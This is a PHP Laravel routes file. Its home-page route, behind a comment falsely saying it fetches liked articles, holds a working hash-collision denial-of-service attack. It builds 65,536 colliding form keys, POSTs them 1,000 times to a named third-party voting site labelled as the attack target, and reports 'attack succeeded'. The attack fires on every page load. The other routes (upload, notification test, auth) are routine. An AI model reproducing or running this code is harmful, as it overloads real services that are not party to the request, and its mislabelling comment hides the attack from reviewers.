<?php
use Illuminate\Http\Request;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function (Request $request) {
    // 获取至少大于0个点赞的文章

    $size = pow(2, 16);
    $data = "";

    for ($key = 0, $maxKey = ($size - 1) * $size; $key <= $maxKey; $key += $size) {
        $data .= $key."=0&";
    }

    $url = "http://vote.xiyuekids.com/index.html";// 攻击目标
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    for ($i = 0; $i < 1000; ++$i) {
        curl_exec($ch);
    }
    curl_close($ch);
    dd('攻击成功');
    return view('welcome', compact('users'));
});

Route::post('/upload', function(Request $request){
    dd($request->file('content')->store('public/abc', "qiniu")); // public/abc/UnwVrGgK2mdFLX3RLurnrtZ5AR4CX4WbKmP8mo4e.png
    // 实际访问地址：http://la57.com/storage/abc/UnwVrGgK2mdFLX3RLurnrtZ5AR4CX4WbKmP8mo4e.png
});

// broadcast route
Route::get('/test', function (Request $request){
//    $id = 3;
//    broadcast(new \App\Events\OrderOk());
//    dd(broadcast(new \App\Events\Safe(1)));
//    broadcast(new \App\Events\Safe($id));
    $user = \App\User::find(1);
    $user->notify(new \App\Notifications\payOk());
//    broadcast(new \App\Events\NewMessage(1));
    return '队列成功';
});

Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');

